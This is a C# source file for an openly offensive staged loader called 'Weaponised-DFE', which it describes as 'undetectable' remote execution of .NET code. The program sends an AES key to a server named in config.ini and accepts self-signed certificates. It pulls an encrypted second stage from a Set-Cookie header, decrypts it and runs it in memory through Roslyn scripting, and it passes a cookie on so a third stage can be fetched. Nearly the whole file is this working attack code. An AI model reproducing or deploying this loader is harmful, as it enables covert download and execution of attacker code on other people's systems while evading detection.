/**
 * Name: Weaponised-DFE
 * Created By: Sayan Ray [@BareBones90]
 * Description: Undetectable and secure remote execution of .NET Assemblies
*/

// Imports
using System.Net;
using System.Text;
using System.Text.Json;
using System.Security.Cryptography;
using Microsoft.CodeAnalysis.Scripting;
using Microsoft.CodeAnalysis.CSharp.Scripting;
using System.IO;
using System.Text.RegularExpressions;

class AESCipher
{
    // Generate the cipher key and initialization vector (iv)
    // This will be generated only once in the program, and will be used throught the program
    public byte[] key = GenerateRandomBytes(16);
    public byte[] iv = GenerateRandomBytes(16);

    // Generate Random Bytes for using as cipher key and iv
    public static byte[] GenerateRandomBytes(int length)
    {
        byte[] randomBytes = new byte[length];

        RandomNumberGenerator rng = RandomNumberGenerator.Create();
        rng.GetBytes(randomBytes);
        return randomBytes;
    }

    // Implement AES Encryption
    public string EncryptAES(string text)
    {
        Aes aes = Aes.Create();
        aes.Key = this.key;
        aes.IV = this.iv;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;

        using (MemoryStream memoryStream = new MemoryStream())
        using (ICryptoTransform encryptor = aes.CreateEncryptor())
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
        {
            byte[] bytes = Encoding.UTF8.GetBytes(text);
            cryptoStream.Write(bytes, 0, bytes.Length);
            cryptoStream.FlushFinalBlock();

            // Convert encrypted bytes to Base64
            return Convert.ToBase64String(memoryStream.ToArray());
        }
    }

    // Implement AES Decryption
    public string DecryptAES(string encryptedText)
    {
        Aes aes = Aes.Create();
        aes.Key = this.key;
        aes.IV = this.iv;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;

        using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(encryptedText)))
        using (ICryptoTransform decryptor = aes.CreateDecryptor())
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
        using (MemoryStream output = new MemoryStream())
        {
            cryptoStream.CopyTo(output);
            return Encoding.UTF8.GetString(output.ToArray());
        }
    }
}

// This class contains a global variable, which we will pass to the stage 2.
// In order to validate the client to the server to fetch the stage 3.
public class Globals
{
    public string cookieValue = "";
}

public class Helpers
{
    // The same Key and IV used throught the program
    public byte[] originalKey { get; set; } = new byte[24];
    public byte[] originalIv { get; set; } = new byte[24];

    // Because we can't return the response object asynchronously, we have to do it this way.
    public HttpResponseMessage resp = new HttpResponseMessage();

    public async Task Eval(string expression, string jsonData)
    {
        // Add script options, so that the stage 2 can use the references, and evaluate smoothly
        var options = ScriptOptions.Default.AddReferences(
            typeof(Globals).Assembly // Ensure Globals is accessible
        ).AddImports();

        AESCipher aes = new AESCipher();
        aes.key = this.originalKey;
        aes.iv = this.originalIv;

        // AES encrypt the jsonData, and set it to the cookieValue 
        string cookie = aes.EncryptAES(jsonData);
        Globals globals = new Globals { cookieValue = cookie };

        // Pass the Globals object, the script options, and the expression to the evaluate function.
        await CSharpScript.EvaluateAsync<int>(expression, options, globals);
    }

    // Implementation of the POST request function.
    public async Task Post(string url, string jsonData = "", string cookieName = "", string cookieValue = "")
    {
        // Make a custom handler for ignoring the self-signed certificates.
        HttpClientHandler handler;
        if (cookieName.Equals(""))
        {
            handler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true
            };
        }
        else
        {
            // Set the cookies
            var cookieContainer = new CookieContainer();
            cookieContainer.Add(new Uri(url), new Cookie(cookieName, cookieValue));

            // Add the cookies to our handler.
            handler = new HttpClientHandler
            {
                CookieContainer = cookieContainer,
                ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true
            };
        }

        HttpClient client = new HttpClient(handler);
        try
        {
            // Set the Json data to be sent.
            var data =  new StringContent(jsonData, Encoding.UTF8, "application/json");

            // Get the response back
            HttpResponseMessage resp = await client.PostAsync(url, data);
            this.resp = resp; // Set resp to be accessible from the caller functions by assigning it to the global variable
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
            Environment.Exit(-1);
        }
    }
}

class Weaponised_DFE
{
    // Will contain the original Key and IV
    public static byte[] originalKey { get; set; } = new byte[24];
    public static byte[] originalIv { get; set; } = new byte[24];
    
    // Will contain the post data to be sent.
    public static object data { get; set; } = new {};
    public static string jsonData { get; set; } = "";

    static void Initialize()
    {
        AESCipher aes = new AESCipher();
        originalKey = aes.key;
        originalIv = aes.iv;

        data = new
        {
            baseKey = originalKey,
            baseIv = originalIv
        };

        jsonData = JsonSerializer.Serialize(data);
    }

    static string Decrypt(string base64Text)
    {
        // AES Decrypt and return the contents.
        AESCipher aes = new AESCipher();
        aes.key = originalKey;
        aes.iv = originalIv;
        string contents = aes.DecryptAES(base64Text);
        return contents;
    }

    // Modified to accept endpoint as a parameter
    static async Task SendPair(string url, string endpoint)
    {
        // Read the config.ini file to get the URL & endpoint 
        url = url + endpoint;

        // Create a new Helpers instance
        Helpers helper = new Helpers();

        // Send the initial data to send the key:iv pair
        await helper.Post(url, jsonData, "userId", "12345675141");
        HttpResponseMessage resp = helper.resp;

        // Get the response string back.
        string content = await resp.Content.ReadAsStringAsync();

        // The server uses Set-Cookie to send the stage 2, we need to receive it.
        string sessionId = GetCookie(resp, "sessionId");
        // Decrypt the stage 2 using AES.
        string dec = Decrypt(sessionId);

        // Weaponised_DFE.Eval() -> evaluate the code asynchronously
        await Eval(dec);
    }

    static async Task Eval(string expression)
    {
        // Create a new instance of Helpers and call the Eval function with the jsonData, to validate the fetching of stage 3
        Helpers helper = new Helpers();
        helper.originalKey = originalKey;
        helper.originalIv = originalIv;

        await helper.Eval(expression, jsonData);
    }

    static string GetCookie(HttpResponseMessage resp, string cookieName)
    {
        // Simply get the cookie contents.

        if (resp.Headers.Contains("Set-Cookie"))
        {
            foreach (var cookie in resp.Headers.GetValues("Set-Cookie"))
            {
                if (cookie.StartsWith(cookieName + "="))
                {
                    string cookieValue = cookie.Split(';')[0].Substring(cookieName.Length + 1);
                    return cookieValue;
                }
            }
        }
        return "";
    }

    static async Task Main()
    {
        // Read the config.ini file to get the URL
        string configPath = Path.Combine(Directory.GetCurrentDirectory(), "config.ini");
        string configContent = File.ReadAllText(configPath);
        string url = Regex.Match(configContent, @"url=\[(.*?)\]").Groups[1].Value;
        string endpoint = Regex.Match(configContent, @"endpoint=\[(.*?)\]").Groups[1].Value;
        Initialize();
        await SendPair(url, endpoint);
    }
}